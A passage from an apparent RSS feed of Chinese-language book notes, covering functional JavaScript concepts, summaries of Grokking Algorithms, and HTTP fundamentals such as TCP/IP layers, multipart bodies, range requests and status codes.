  <span>if</span> <span>(</span>n <span>==</span> <span>0</span><span>)</span> <span>return</span> <span>0</span>
  <span>else</span> <span>return</span> <span>fib</span><span>(</span>n <span>-</span> <span>1</span><span>)</span> <span>+</span> <span>fib_</span><span>(</span>n<span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div></li>
<li>
<p>递归的优点是它更具声明性，因此通常更易于阅读。缺点通常是性能方面，但是相比执行速度，更多的限制在于内存方面。</p>
</li>
</ul>
<h2 id="_7-transducing"> 7. <a href="https://wizardforcel.gitbooks.io/functional-light-js/content/apA.html" target="_blank" rel="noopener noreferrer">Transducing</a></h2>
<ul>
<li>
<p>Transduce 就是通过减少来转换。更具体点，transduer 是可组合的 reducer。</p>
</li>
<li>
<p>我们使用转换来组合相邻的 map(..)、filter(..) 和 reduce(..) 操作。我们首先将 map(..) 和 filter(..) 表示为 reduce(..)，然后抽象出常用的组合操作来创建一个容易组合的一致的 reducer 生成函数。</p>
</li>
<li>
<p>transducing 主要提高性能，如果在延迟序列（异步 observables）中使用，则这一点尤为明显。</p>
</li>
<li>
<p>但是更广泛地说，transducing 是我们针对那些不能被直接组合的函数，使用的一种更具声明式风格的方法。否则这些函数将不能直接组合。如果使用这个技术能像使用本书中的所有其他技术一样用的恰到好处，代码就会显得更清晰，更易读！ 使用 transducer 进行单次 reduce(..) 调用比追踪多个 reduce(..) 调用更容易理解。</p>
</li>
</ul>
<h2 id="_8-monad"> 8. Monad</h2>
<ul>
<li>
<p>Monad 的核心思想是，它必须对所有的值都是有效的，不能对值做任何检查 —— 甚至是空值检查。</p>
</li>
<li>
<p>Monad 是一个值类型，一个接口，一个有封装行为的对象数据结构。</p>
</li>
<li>
<p>但是这些定义中没有一个是有用的。这里尝试做一个更好的解释：Monad 是一个用更具有声明式的方式围绕一个值来组织行为的方法。</p>
</li>
<li>
<p><a href="https://www.ruanyifeng.com/blog/2015/07/monad.html" target="_blank" rel="noopener noreferrer">阮一峰</a>：简单说，Monad 就是一种设计模式，表示将一个运算过程，通过函数拆解成互相连接的多个步骤。你只要提供下一步运算所需的函数，整个运算就会自动进行下去。</p>
</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>算法图解</title>
      <link>https://www.matrixtheone.ga/web/note/books/Grokking-Algorithms/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/Grokking-Algorithms/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">算法图解</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-算法简介"> 1. 算法简介</h2>
<ul>
<li>
<p>大 O 表示法是一种特殊的表示法，指出了算法的速度有多快。</p>
</li>
<li>
<p>大 O 表示法指的并非以秒为单位的速度。大 O 表示法让你能够比较操作数，它指出了算法运行时间的增速。</p>
</li>
<li>
<p>一些常见的大 O 运行时间。</p>
<ol>
<li>O(log n)，也叫对数时间，这样的算法包括二分查找。</li>
<li>O(n)，也叫线性时间，这样的算法包括简单查找。</li>
<li>O(n * log n)，这样的算法包括第 4 章将介绍的快速排序 —— 一种速度较快的排序算法。</li>
<li>O(n 2 )，这样的算法包括第 2 章将介绍的选择排序 —— 一种速度较慢的排序算法。</li>
<li>O(n!)，这样的算法包括接下来将介绍的旅行商问题的解决方案 —— 一种非常慢的算法。</li>
</ol>
</li>
<li>
<p>小结：</p>
<ol>
<li>二分查找的速度比简单查找快得多。</li>
<li>O(log n)比 O(n)快。需要搜索的元素越多，前者比后者就快得越多。</li>
<li>算法运行时间并不以秒为单位。</li>
<li>算法运行时间是从其增速的角度度量的。</li>
<li>算法运行时间用大 O 表示法表示。</li>
</ol>
</li>
</ul>
<h2 id="_2-选择排序"> 2. 选择排序</h2>
<ul>
<li>
<p>小结：</p>
<ol>
<li>数组的元素都在一起。</li>
<li>链表的元素是分开的，其中每个元素都存储了下一个元素的地址。</li>
<li>数组的读取速度很快。</li>
<li>链表的插入和删除速度很快。</li>
</ol>
</li>
</ul>
<h2 id="_3-快速排序"> 3. 快速排序</h2>
<ul>
<li>
<p>小结：</p>
<ol>
<li>D&amp;C 将问题逐步分解。使用 D&amp;C 处理列表时，基线条件很可能是空数组或只包含一个元素的数组。</li>
<li>实现快速排序时，请随机地选择用作基准值的元素。快速排序的平均运行时间为 O(n log n)。</li>
<li>大 O 表示法中的常量有时候事关重大，这就是快速排序比合并排序快的原因所在。</li>
</ol>
</li>
</ul>
<h2 id="_4-散列表"> 4. 散列表</h2>
<ul>
<li>
<p>小结：</p>
<ol>
<li>冲突很糟糕，你应使用可以最大限度减少冲突的散列函数。</li>
<li>散列表的查找、插入和删除速度都非常快。</li>
<li>散列表适合用于模拟映射关系。</li>
<li>一旦填装因子超过 0.7，就该调整散列表的长度。</li>
<li>散列表可用于缓存数据（例如，在 Web 服务器上）。</li>
<li>散列表非常适合用于防止重复。</li>
</ol>
</li>
</ul>
<h2 id="_5-广度优先搜索"> 5. 广度优先搜索</h2>
<ul>
<li>
<p>广度优先搜索让你能够找出两样东西之间的最短距离，不过最短距离的含义有很多！</p>
</li>
<li>
<p>小结：</p>
<ol>
<li>广度优先搜索指出是否有从 A 到 B 的路径。</li>
<li>如果有，广度优先搜索将找出最短路径。</li>
<li>面临类似于寻找最短路径的问题时，可尝试使用图来建立模型，再使用广度优先搜索来解决问题。</li>
<li>你需要按加入顺序检查搜索列表中的人，否则找到的就不是最短路径，因此搜索列表必须是队列。</li>
<li>对于检查过的人，务必不要再去检查，否则可能导致无限循环。</li>
</ol>
</li>
</ul>
<h2 id="_6-狄克斯特拉算法"> 6. 狄克斯特拉算法</h2>
<ul>
<li>
<p>狄克斯特拉算法背后的关键理念：找出图中最便宜的节点，并确保没有到该节点的更便宜的路径！</p>
</li>
<li>
<p>不能将狄克斯特拉算法用于包含负权边的图。在包含负权边的图中，要找出最短路径，可使用另一种算法 —— 贝尔曼 - 福德算法。</p>
</li>
<li>
<p>小结：</p>
<ol>
<li>广度优先搜索用于在非加权图中查找最短路径。</li>
<li>狄克斯特拉算法用于在加权图中查找最短路径。</li>
<li>仅当权重为正时狄克斯特拉算法才管用。</li>
<li>如果图中包含负权边，请使用贝尔曼 - 福德算法。</li>
</ol>
</li>
</ul>
<h2 id="_7-贪婪算法"> 7. 贪婪算法</h2>
<p>贪婪算法：每步都采取最优的做法。</p>
<ul>
<li>
<p>小结：</p>
<ol>
<li>贪婪算法寻找局部最优解，企图以这种方式获得全局最优解。</li>
<li>对于 NP 完全问题，还没有找到快速解决方案。</li>
<li>面临 NP 完全问题时，最佳的做法是使用近似算法。</li>
<li>贪婪算法易于实现、运行速度快，是不错的近似算法。</li>
</ol>
</li>
</ul>
<h2 id="_8-动态规划"> 8. 动态规划</h2>
<ul>
<li>
<p>动态规划先解决子问题，再逐步解决大问题。</p>
</li>
<li>
<p>小结：</p>
<ol>
<li>需要在给定约束条件下优化某种指标时，动态规划很有用。</li>
<li>问题可分解为离散子问题时，可使用动态规划来解决。</li>
<li>每种动态规划解决方案都涉及网格。</li>
<li>单元格中的值通常就是你要优化的值。</li>
<li>每个单元格都是一个子问题，因此你需要考虑如何将问题分解为子问题。</li>
<li>没有放之四海皆准的计算动态规划解决方案的公式。</li>
</ol>
</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>图解 HTTP</title>
      <link>https://www.matrixtheone.ga/web/note/books/HTTP/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/HTTP/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">图解 HTTP</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-网络基础-tcp-ip"> 1. 网络基础 TCP/IP</h2>
<ul>
<li>通常使用的网络（包括互联网）是在 TCP/IP 协议族的基础上运作的，而 HTTP 属于它内部的一个子集。</li>
</ul>
<h2 id="_2-tcp-ip-的分层管理"> 2. TCP/IP 的分层管理</h2>
<ul>
<li>
<p>TCP/IP 协议族里重要的一点就是分层。TCP/IP 协议族按层次分别分为以下 4 层：应用层、传输层、网络层和数据链路层。</p>
</li>
<li>
<p>应用层。</p>
<blockquote>
<ul>
<li>应用层决定了向用户提供应用服务时通信的活动。</li>
<li>TCP/IP 协议族内预存了各类通用的应用服务。比如，FTP（FileTransfer Protocol，文件传输协议）和 DNS（Domain Name System，域名系统）服务就是其中两类。</li>
<li>HTTP 协议也处于该层。</li>
</ul>
</blockquote>
</li>
<li>
<p>传输层。</p>
<blockquote>
<ul>
<li>传输层对上层应用层，提供处于网络连接中的两台计算机之间的数据传输。</li>
<li>在传输层有两个性质不同的协议：TCP（Transmission ControlProtocol，传输控制协议）和 UDP（User Data Protocol，用户数据报协议）。</li>
</ul>
</blockquote>
</li>
<li>
<p>网络层（又名网络互连层）。</p>
<blockquote>
<ul>
<li>网络层用来处理在网络上流动的数据包。数据包是网络传输的最小数据单位。该层规定了通过怎样的路径（所谓的传输路线）到达对方计算机，并把数据包传送给对方。</li>
<li>与对方计算机之间通过多台计算机或网络设备进行传输时，网络层所起的作用就是在众多的选项内选择一条传输路线。</li>
</ul>
</blockquote>
</li>
<li>
<p>链路层（又名数据链路层，网络接口层）。</p>
<blockquote>
<ul>
<li>用来处理连接网络的硬件部分。包括控制操作系统、硬件的设备驱动、NIC（Network Interface Card，网络适配器，即网卡），及光纤等物理可见部分（还包括连接器等一切传输媒介）。硬件上的范畴均在链路层的作用范围之内。</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_3-tcp-ip-通信传输流"> 3. TCP/IP 通信传输流</h2>
<ul>
<li>利用 TCP/IP 协议族进行网络通信时，会通过分层顺序与对方进行通信。发送端从应用层往下走，接收端则往应用层往上走。</li>
</ul>
<img :src="$withBase('/images/HTTP/TCPIP 通信传输流-1.png')" loading="lazy">
<ul>
<li>
<p>我们用 HTTP 举例来说明，首先作为发送端的客户端在应用层（HTTP 协议）发出一个想看某个 Web 页面的 HTTP 请求。</p>
</li>
<li>
<p>接着，为了传输方便，在传输层（TCP 协议）把从应用层处收到的数据（HTTP 请求报文）进行分割，并在各个报文上打上标记序号及端口号后转发给网络层。</p>
</li>
<li>
<p>在网络层（IP 协议），增加作为通信目的地的 MAC 地址后转发给链路层。这样一来，发往网络的通信请求就准备齐全了。</p>
</li>
<li>
<p>接收端的服务器在链路层接收到数据，按序往上层发送，一直到应用层。当传输到应用层，才能算真正接收到由客户端发送过来的 HTTP 请求。</p>
</li>
<li>
<p>发送端在层与层之间传输数据时，每经过一层时必定会被打上一个该层所属的首部信息。反之，接收端在层与层传输数据时，每经过一层时会把对应的首部消去。</p>
<blockquote>
<p>这种把数据信息包装起来的做法称为封装（encapsulate）。</p>
</blockquote>
</li>
</ul>
<img :src="$withBase('/images/HTTP/TCPIP 通信传输流-2.png')" loading="lazy">
<h2 id="_4-负责传输的-ip-协议"> 4. 负责传输的 IP 协议</h2>
<ul>
<li>
<p>按层次分，IP（Internet Protocol）网际协议位于网络层。InternetProtocol 这个名称可能听起来有点夸张，但事实正是如此，因为几乎所有使用网络的系统都会用到 IP 协议。TCP/IP 协议族中的 IP 指的就是网际协议，协议名称中占据了一半位置，其重要性可见一斑。可能有人会把 “IP” 和 “IP 地址” 搞混，“IP” 其实是一种协议的名称。</p>
</li>
<li>
<p>IP 协议的作用是把各种数据包传送给对方。而要保证确实传送到对方那里，则需要满足各类条件。其中两个重要的条件是 IP 地址和 MAC 地址（Media Access Control Address）。</p>
</li>
<li>
<p>IP 地址指明了节点被分配到的地址，MAC 地址是指网卡所属的固定地址。IP 地址可以和 MAC 地址进行配对。IP 地址可变换，但 MAC 地址基本上不会更改。</p>
</li>
<li>
<p>使用 ARP 协议凭借 MAC 地址进行通信。</p>
<blockquote>
<p>IP 间的通信依赖 MAC 地址。在网络上，通信的双方在同一局域网（LAN）内的情况是很少的，通常是经过多台计算机和网络设备中转才能连接到对方。而在进行中转时，会利用下一站中转设备的 MAC 地址来搜索下一个中转目标。这时，会采用 ARP 协议（AddressResolution Protocol）。ARP 是一种用以解析地址的协议，根据通信方的 IP 地址就可以反查出对应的 MAC 地址。</p>
</blockquote>
</li>
</ul>
<img :src="$withBase('/images/HTTP/负责传输的 IP 协议.png')" loading="lazy">
<h2 id="_5-确保可靠性的-tcp-协议"> 5. 确保可靠性的 TCP 协议</h2>
<ul>
<li>
<p>按层次分，TCP 位于传输层，提供可靠的字节流服务。所谓的字节流服务（Byte Stream Service）是指，为了方便传输，将大块数据分割成以报文段（segment）为单位的数据包进行管理。而可靠的传输服务是指，能够把数据准确可靠地传给对方。一言以蔽之，TCP 协议为了更容易传送大数据才把数据分割，而且 TCP 协议能够确认数据最终是否送达到对方。</p>
</li>
<li>
<p>为了准确无误地将数据送达目标处，TCP 协议采用了三次握手（three-way handshaking）策略。用 TCP 协议把数据包送出去后，TCP 不会对传送后的情况置之不理，它一定会向对方确认是否成功送达。握手过程中使用了 TCP 的标志（flag） —— SYN（synchronize） 和 ACK（acknowledgement）。</p>
</li>
<li>
<p>发送端首先发送一个带 SYN 标志的数据包给对方。接收端收到后，回传一个带有 SYN/ACK 标志的数据包以示传达确认信息。最后，发送端再回传一个带 ACK 标志的数据包，代表 “握手” 结束。</p>
</li>
<li>
<p>若在握手过程中某个阶段莫名中断，TCP 协议会再次以相同的顺序发送相同的数据包。</p>
</li>
</ul>
<img :src="$withBase('/images/HTTP/确保可靠性的 TCP 协议.png')" loading="lazy">
<h2 id="_6-负责域名解析的-dns-服务"> 6. 负责域名解析的 DNS 服务</h2>
<ul>
<li>DNS（Domain Name System）服务是和 HTTP 协议一样位于应用层的协议。它提供域名到 IP 地址之间的解析服务。</li>
</ul>
<img :src="$withBase('/images/HTTP/负责域名解析的 DNS 服务.png')" loading="lazy">
<h2 id="_7-各种协议与-http-协议的关系"> 7. 各种协议与 HTTP 协议的关系</h2>
<img :src="$withBase('/images/HTTP/各种协议与 HTTP 协议的关系.png')" loading="lazy">
<h2 id="_8-统一资源标识符"> 8. 统一资源标识符</h2>
<ul>
<li>
<p>URI 是 Uniform Resource Identifier 的缩写。RFC2396 分别对这 3 个单词进行了如下定义。</p>
<blockquote>
<ul>
<li>Uniform：规定统一的格式可方便处理多种不同类型的资源，而不用根据上下文环境来识别资源指定的访问方式。另外，加入新增的协议方案（如 http: 或 ftp:）也更容易。</li>
<li>Resource：资源的定义是 “可标识的任何东西”。除了文档文件、图像或服务（例如当天的天气预报）等能够区别于其他类型的，全都可作为资源。另外，资源不仅可以是单一的，也可以是多数的集合体。</li>
<li>Identifier：表示可标识的对象，也称为标识符。</li>
</ul>
</blockquote>
</li>
<li>
<p>综上所述，URI 就是由某个协议方案表示的资源的定位标识符。协议方案是指访问资源所使用的协议类型名称。采用 HTTP 协议时，协议方案就是 http。除此之外，还有 ftp、mailto、telnet、file 等。</p>
</li>
<li>
<p>URI 用字符串标识某一互联网资源，而 URL 表示资源的地点（互联网上所处的位置）。可见 URL 是 URI 的子集。</p>
</li>
<li>
<p>绝对 URI 的格式。</p>
<img :src="$withBase('/images/HTTP/统一资源标识符.png')" loading="lazy">
</li>
</ul>
<h2 id="_9-通过请求和响应的交换达成通信"> 9. 通过请求和响应的交换达成通信</h2>
<ul>
<li>
<p>请求报文的构成。</p>
<img :src="$withBase('/images/HTTP/请求报文的构成.png')" loading="lazy">
</li>
<li>
<p>响应报文的构成。</p>
<img :src="$withBase('/images/HTTP/响应报文的构成.png')" loading="lazy">
</li>
</ul>
<h2 id="_10-http-是不保存状态的协议"> 10. HTTP 是不保存状态的协议</h2>
<ul>
<li>
<p>HTTP 是一种不保存状态，即无状态（stateless）协议。HTTP 协议自身不对请求和响应之间的通信状态进行保存。也就是说在 HTTP 这个级别，协议对于发送过的请求或响应都不做持久化处理。</p>
</li>
<li>
<p>使用 HTTP 协议，每当有新的请求发送时，就会有对应的新响应产生。协议本身并不保留之前一切的请求或响应报文的信息。这是为了更快地处理大量事务，确保协议的可伸缩性，而特意把 HTTP 协议设计成如此简单的。可是，随着 Web 的不断发展，因无状态而导致业务处理变得棘手的情况增多了。</p>
</li>
<li>
<p>HTTP/1.1 虽然是无状态协议，但为了实现期望的保持状态功能，于是引入了 Cookie 技术。有了 Cookie 再用 HTTP 协议通信，就可以管理状态了。</p>
</li>
</ul>
<h2 id="_11-使用方法下达命令"> 11. 使用方法下达命令</h2>
<ul>
<li>HTTP/1.0 和 HTTP/1.1 支持的方法。</li>
</ul>
<img :src="$withBase('/images/HTTP/使用方法下达命令.png')" loading="lazy">
<h2 id="_12-持久连接节省通信量"> 12. 持久连接节省通信量</h2>
<ul>
<li>
<p>HTTP 协议的初始版本中，每进行一次 HTTP 通信就要断开一次 TCP 连接。</p>
</li>
<li>
<p>为解决上述 TCP 连接的问题，HTTP/1.1 和一部分的 HTTP/1.0 想出了持久连接（HTTP Persistent Connections，也称为 HTTP keep-alive 或 HTTP connection reuse）的方法。持久连接的特点是，只要任意一端没有明确提出断开连接，则保持 TCP 连接状态。</p>
</li>
<li>
<p>在 HTTP/1.1 中，所有的连接默认都是持久连接，但在 HTTP/1.0 内并未标准化。</p>
</li>
<li>
<p>持久连接使得多数请求以管线化（pipelining）方式发送成为可能。从前发送请求后需等待并收到响应，才能发送下一个请求。管线化技术出现后，不用等待响应亦可直接发送下一个请求。这样就能够做到同时并行发送多个请求，而不需要一个接一个地等待响应了。</p>
</li>
</ul>
<h2 id="_13-使用-cookie-的状态管理"> 13. 使用 Cookie 的状态管理</h2>
<ul>
<li>
<p>Cookie 会根据从服务器端发送的响应报文内的一个叫做 Set-Cookie 的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。</p>
</li>
<li>
<p>服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。</p>
</li>
</ul>
<h2 id="_14-http-报文"> 14. HTTP 报文</h2>
<ul>
<li>
<p>用于 HTTP 协议交互的信息被称为 HTTP 报文。请求端（客户端）的 HTTP 报文叫做请求报文，响应端（服务器端）的叫做响应报文。HTTP 报文本身是由多行（用 CR+LF 作换行符）数据构成的字符串文本。</p>
</li>
<li>
<p>HTTP 报文的结构。</p>
<img :src="$withBase('/images/HTTP/HTTP 报文的结构.png')" loading="lazy">
</li>
<li>
<p>请求报文及响应报文的结构。</p>
<img :src="$withBase('/images/HTTP/请求报文及响应报文的结构.png')" loading="lazy">
</li>
</ul>
<h2 id="_15-报文主体和实体主体的差异"> 15. 报文主体和实体主体的差异</h2>
<ul>
<li>
<p>报文（message）：是 HTTP 通信中的基本单位，由 8 位组字节流（octet sequence，其中 octet 为 8 个比特）组成，通过 HTTP 通信传输。</p>
</li>
<li>
<p>实体（entity）：作为请求或响应的有效载荷数据（补充项）被传输，其内容由实体首部和实体主体组成。</p>
</li>
<li>
<p>HTTP 报文的主体用于传输请求或响应的实体主体。通常，报文主体等于实体主体。只有当传输中进行编码操作时，实体主体的内容发生变化，才导致它和报文主体产生差异。</p>
</li>
</ul>
<h2 id="_16-压缩传输的内容编码"> 16. 压缩传输的内容编码</h2>
<ul>
<li>
<p>内容编码指明应用在实体内容上的编码格式，并保持实体信息原样压缩。内容编码后的实体由客户端接收并负责解码。</p>
</li>
<li>
<p>常用的内容编码有以下几种。</p>
<ol>
<li>gzip（GNU zip）</li>
<li>compress（UNIX 系统的标准压缩）</li>
<li>deflate（zlib）</li>
<li>identity（不进行编码）</li>
</ol>
</li>
</ul>
<h2 id="_17-分割发送的分块传输编码"> 17. 分割发送的分块传输编码</h2>
<ul>
<li>
<p>在 HTTP 通信过程中，请求的编码实体资源尚未全部传输完成之前，浏览器无法显示请求页面。在传输大容量数据时，通过把数据分割成多块，能够让浏览器逐步显示页面。</p>
</li>
<li>
<p>这种把实体主体分块的功能称为分块传输编码（Chunked TransferCoding）。</p>
</li>
<li>
<p>分块传输编码会将实体主体分成多个部分（块）。每一块都会用十六进制来标记块的大小，而实体主体的最后一块会使用 “0(CR+LF)” 来标记。</p>
</li>
<li>
<p>HTTP/1.1 中存在一种称为传输编码（Transfer Coding）的机制，它可以在通信时按某种编码方式传输，但只定义作用于分块传输编码中。</p>
</li>
</ul>
<h2 id="_18-发送多种数据的多部分对象集合"> 18. 发送多种数据的多部分对象集合</h2>
<ul>
<li>
<p>发送邮件时，我们可以在邮件里写入文字并添加多份附件。这是因为采用了 MIME（Multipurpose Internet Mail Extensions，多用途因特网邮件扩展）机制，它允许邮件处理文本、图片、视频等多个不同类型的数据。例如，图片等二进制数据以 ASCII 码字符串编码的方式指明，就是利用 MIME 来描述标记数据类型。而在 MIME 扩展中会使用一种称为多部分对象集合（Multipart）的方法，来容纳多份不同类型的数据。</p>
</li>
<li>
<p>相应地，HTTP 协议中也采纳了多部分对象集合，发送的一份报文主体内可含有多类型实体。通常是在图片或文本文件等上传时使用。</p>
</li>
<li>
<p>多部分对象集合包含的对象如下。</p>
<blockquote>
<p>multipart/form-data: 在 Web 表单文件上传时使用。</p>
</blockquote>
<div><pre><code><span><span>Content-Type</span><span>:</span> <span>multipart/form-data; boundary=AaB03x</span></span>
--AaB03x
<span><span>Content-Disposition</span><span>:</span> <span>form-data; name="field1"</span></span>
Joe Blow
--AaB03x
<span><span>Content-Disposition</span><span>:</span> <span>form-data; name="pics"; filename="file1.txt"</span></span>
<span><span>Content-Type</span><span>:</span> <span>text/plain</span></span>
<span>...（file1.txt的数据）...
--AaB03x--
</span></code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><blockquote>
<p>multipart/byteranges: 状态码 206（Partial Content，部分内容）响应报文包含了多个范围的内容时使用。</p>
</blockquote>
<div><pre><code><span><span>HTTP/1.1</span> <span>206</span> <span>Partial Content</span></span>
<span><span>Date</span><span>:</span> <span>Fri, 13 Jul 2012 02:45:26 GMT</span></span>
<span><span>Last-Modified</span><span>:</span> <span>Fri, 31 Aug 2007 02:02:20 GMT</span></span>
<span><span>Content-Type</span><span>:</span> <span>multipart/byteranges; boundary=THIS_STRING_SEPARATES</span></span>
--THIS_STRING_SEPARATES
<span><span>Content-Type</span><span>:</span> <span>application/pdf</span></span>
<span><span>Content-Range</span><span>:</span> <span>bytes 500-999/8000</span></span>
...（范围指定的数据）...
--THIS_STRING_SEPARATES
<span><span>Content-Type</span><span>:</span> <span>application/pdf</span></span>
<span><span>Content-Range</span><span>:</span> <span>bytes 7000-7999/8000</span></span>
...（范围指定的数据）...
--THIS_STRING_SEPARATES--
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div></li>
<li>
<p>使用 boundary 字符串来划分多部分对象集合指明的各类实体。在 boundary 字符串指定的各个实体的起始行之前插入 “--” 标记（例如：--AaB03x、--THIS_STRING_SEPARATES），而在多部分对象集合对应的字符串的最后插入 “--” 标记（例如：--AaB03x--、--THIS_STRING_SEPARATES--）作为结束。</p>
</li>
<li>
<p>多部分对象集合的每个部分类型中，都可以含有首部字段。</p>
</li>
</ul>
<h2 id="_19-获取部分内容的范围请求"> 19. 获取部分内容的范围请求</h2>
<ul>
<li>
<p>以前，用户不能使用现在这种高速的带宽访问互联网，当时，下载一个尺寸稍大的图片或文件就已经很吃力了。如果下载过程中遇到网络中断的情况，那就必须重头开始。为了解决上述问题，需要一种可恢复的机制。所谓恢复是指能从之前下载中断处恢复下载。</p>
</li>
<li>
<p>要实现该功能需要指定下载的实体范围。像这样，指定范围发送的请求叫做范围请求（Range Request）。</p>
</li>
<li>
<p>对一份 10 000 字节大小的资源，如果使用范围请求，可以只请求 5001~10 000 字节内的资源。</p>
<img :src="$withBase('/images/HTTP/获取部分内容的范围请求.png')" loading="lazy">
</li>
<li>
<p>执行范围请求时，会用到首部字段 Range 来指定资源的 byte 范围。byte 范围的指定形式如下。</p>
<blockquote>
<p>5001~10 000 字节</p>
</blockquote>
<div><pre><code><span><span>Range</span><span>:</span> <span>bytes=5001-10000</span></span>
</code></pre>
<div><span>1</span><br></div></div><blockquote>
<p>从 5001 字节之后全部的</p>
</blockquote>
<div><pre><code><span><span>Range</span><span>:</span> <span>bytes=5001-</span></span>
</code></pre>
<div><span>1</span><br></div></div><blockquote>
<p>从一开始到 3000 字节和 5000~7000 字节的多重范围</p>
</blockquote>
<div><pre><code><span><span>Range</span><span>:</span> <span>bytes=-3000, 5000-7000</span></span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<p>针对范围请求，响应会返回状态码为 206 Partial Content 的响应报文。另外，对于多重范围的范围请求，响应会在首部字段 Content-Type 标明 multipart/byteranges 后返回响应报文。如果服务器端无法响应范围请求，则会返回状态码 200 OK 和完整的实体内容。</p>
</li>
</ul>
<h2 id="_20-返回结果的-http-状态码"> 20. 返回结果的 HTTP 状态码</h2>
<ul>
<li>
<p>状态码的类别。</p>
<img :src="$withBase('/images/HTTP/状态码的类别.png')" loading="lazy">
</li>
<li>
<p>2XX 成功。</p>
<ul>
<li>
<p>200 OK：表示从客户端发来的请求在服务器端被正常处理了。在响应报文内，随状态码一起返回的信息会因方法的不同而发生改变。比如，使用 GET 方法时，对应请求资源的实体会作为响应返回。而使用 HEAD 方法时，对应请求资源的实体首部不随报文主体作为响应返回（即在响应中只返回首部，不会返回实体的主体部分）。</p>
</li>
<li>
<p>204 No Content：该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，也不允许返回任何实体的主体。比如，当从浏览器发出请求处理后，返回 204 响应，那么浏览器显示的页面不发生更新。一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用。</p>
</li>
<li>
<p>206 Partial Content：该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的 GET 请求。响应报文中包含由 Content-Range 指定范围的实体内容。</p>
</li>
</ul>
</li>
<li>
<p>3XX 重定向/缓存。</p>
<ul>
<li>301 Moved Permanently：永久性重定向。该状态码表示请求的资源已被分配了新的 URI，以后应使用资源现在所指的 URI。也就是说，如果已经把资源对应的 URI 保存为书签了，这时应该按 Location 首部字段提示的 URI 重新保存。</li>
</ul>
<div><pre><code>&lt;!-- 像下方给出的请求 URI，当指定资源路径的最后忘记添加斜杠 “/”，就会产生 301 状态码 -->
<span><span>https</span><span>:</span><span>//coderljw.ga/</span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><ul>
<li>
<p>302 Found：临时性重定向。该状态码表示请求的资源已被分配了新的 URI，希望用户（本次）能使用新的 URI 访问。和 301 Moved Permanently 状态码相似，但 302 状态码代表的资源不是被永久移动，只是临时性质的。换句话说，已移动的资源对应的 URI 将来还有可能发生改变。比如，用户把 URI 保存成书签，但不会像 301 状态码出现时那样去更新书签，而是仍旧保留返回 302 状态码的页面对应的 URI。</p>
</li>
<li>
<p>303 See Other：该状态码表示由于请求对应的资源存在着另一个 URI，应使用 GET 方法定向获取请求的资源。303 状态码和 302 Found 状态码有着相同的功能，但 303 状态码明确表示客户端应当采用 GET 方法获取资源，这点与 302 状态码有区别。</p>
</li>
<li>
<p>当 301、302、303 响应状态码返回时，几乎所有的浏览器都会把 POST 改成 GET，并删除请求报文内的主体，之后请求会自动再次发送。301、302 标准是禁止将 POST 方法改变成 GET 方法的，但实际使用时大家都会这么做。</p>
</li>
<li>
<p>304 Not Modified：该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。304 虽然被划分在 3XX 类别中，但是和重定向没有关系。</p>
</li>
<li>
<p>307 Temporary Redirect：临时重定向。该状态码与 302 Found 有着相同的含义。尽管 302 标准禁止 POST 变换成 GET，但实际使用时大家并不遵守。307 会遵照浏览器标准，不会从 POST 变成 GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同的情况。</p>
</li>
</ul>
</li>
<li>
<p>4XX 错误请求。</p>
<ul>
<li>
<p>400 Bad Request：该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像 200 OK 一样对待该状态码。</p>
</li>
<li>
<p>401 Unauthorized：该状态码表示发送的请求需要有通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息。另外若之前已进行过 1 次请求，则表示用户认证失败。</p>
<img :src="$withBase('/images/HTTP/401 Unauthorized.png')" loading="lazy">
</li>
<li>
<p>403 Forbidden：该状态码表明对请求资源的访问被服务器拒绝了。服务器端没有必要给出拒绝的详细理由，但如果想作说明的话，可以在实体的主体部分对原因进行描述，这样就能让用户看到了。未获得文件系统的访问授权，访问权限出现某些问题（从未授权的发送源 IP 地址试图访问）等列举的情况都可能是发生 403 的原因。</p>
</li>
<li>
<p>404 Not Found：该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。</p>
</li>
</ul>
</li>
<li>
<p>5XX 服务端错误。</p>
<ul>
<li>
<p>500 Internal Server Error：该状态码表明服务器端在执行请求时发生了错误。也有可能是 Web 应用存在的 bug 或某些临时的故障。</p>
</li>
<li>
<p>503 Service Unavailable：该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。如果事先得知解除以上状况需要的时间，最好写入 RetryAfter 首部字段再返回给客户端。</p>
</li>
</ul>
</li>
</ul>
<h2 id="_21-通信数据转发程序-代理、网关、隧道"> 21. 通信数据转发程序 ：代理、网关、隧道</h2>
<ul>
<li>
<p>代理。</p>
<blockquote>
